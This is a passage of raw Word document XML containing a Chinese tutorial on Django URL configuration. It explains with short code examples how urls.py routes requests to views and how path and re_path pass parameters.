        <w:t>，URL的设计与配置，View（视图）的编写，Template（模板）的设计和Form(表单)的使用。今天小编我就来给你来介绍下第二项Django核心基础知识之URL的设计与配置吧。想持续了解后续Django Web开发技术请订阅我的公众号【</w:t>
      </w:r>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Python与Django大咖之路</w:t>
      </w:r>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>】。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C8CAB5F" w14:textId="10187DEB" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7B97246A" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Django的URL是如何工作的</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="705CEC98" w14:textId="11590E94" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="37ED6740" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>URL通常与视图(View）一起工作的。服务器收到用户请求后，会根据urls.py里的关系条目，去视图View里查找到与请求对应的处理方法，从而返回给客户端http页面数据。这和其它web开发的路由机制(Router）是一个道理。如果你还不知道视图是什么，那么你只需要记住：视图收到用户的请求后，展示给用户看得见的东西。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="299EC89C" w14:textId="75610C12" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4B82D1A7" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>我们来看看下面一个新闻博客的例子:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1AF353EC" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t># blog/urls.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A586AC9" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from django.urls import path</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27FC07F0" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="67E820B7" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from . import views</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BE7FC75" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="579BD1C3"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7DB35A5B" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    path('blog/', views.index),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A3C7173" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">      path('blog/article/&lt;int:id&gt;/', views.article),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0134DA0D" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3BAF54DA" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3758808D" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t># blog/views.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DD3B8E8" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>def index(request):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D390834" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    # 展示所有文章</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26A713FF" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C4A22A4" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>def article(request, id):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74B1CA5B" w14:textId="72B6DD06" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    # 展示某篇具体文章</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63AD0B54" w14:textId="731FEA55" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0098828A" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>那么这段代码是如何工作的？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75D4A69F" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>当用户在浏览器输入/blog/时，URL收到请求后会调用视图views.py里的index方法，展示所有文章。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A090E55" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>当用户在浏览器输入/blog/article/&lt;int:id&gt;/时，URL不仅调用了views.py里的article方法，而且还把参数文章id通过&lt;&gt;括号的形式传递给了视图。int这里代表只传递整数，传递的参数名字是id。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4877BFE6" w14:textId="4C06BFE1" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3509BF7C" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>注意当你配置URL时，别忘了把你的app（比如blog）urls加入项目的URL配置里(mysite/urls.py), 如下图所示:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52071909" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from django.conf.urls import url, include</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58995769" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="616A042F"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23309225" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    url(r'^/', include('blog.urls')),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5203C539" w14:textId="3B2F5DDC" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">] </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75B1F8FD" w14:textId="19636B63" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="47AA0795" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Django URL传递参数的方法path和_re_path</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60F1BAC4" w14:textId="36799217" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="18CFCCF9" w14:textId="7E557AE1" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>写个URL很简单，但如何通过URL把参数传递给给视图view是个技术活。Django URL提供了两种匹配方式传递参数: path和re_path。path是正常参数传递，re_path是采用正则表达式regex匹配。path和re_path传递参数方式如下:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76F71D4F" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>path方法：采用双尖括号&lt;变量类型:变量名&gt;或&lt;变量名&gt;传递，例如&lt;int:id&gt;, &lt;slug:slug&gt;或&lt;username&gt;。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B20986E" w14:textId="40F12642" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>re_path方法: 采用命名组(?P&lt;变量名&gt;表达式)的方式传递参数。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C847C0B" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>下图两种传递文章id给视图函数的方式是一样的。re_path里引号前面的小写r表示引号里为正则表达式, 请忽略'\'不要转义，^代表开头，$代表以结尾，\d+代表正整数。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7986D033" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t># blog/urls.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21D1B97B" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from django.urls import path, re_path</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="034AFC6B" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2D6FBABE" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from . import views</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="078DA4CF" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5534C86A"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4E40BF5E" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    path('blog/article/&lt;int:id&gt;/', views.article, name = 'article'),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="310C9411" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">   re_path(r'^blog/article/(?P&lt;id&gt;\d+)/$', views.article, name='article'),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="710A6BD4" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66454FC7" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3CFFD1AA" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t># View (in blog/views.py)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57B57455" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="22B0F58A" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>def article(request, id):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11978D4D" w14:textId="673CCDD3" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
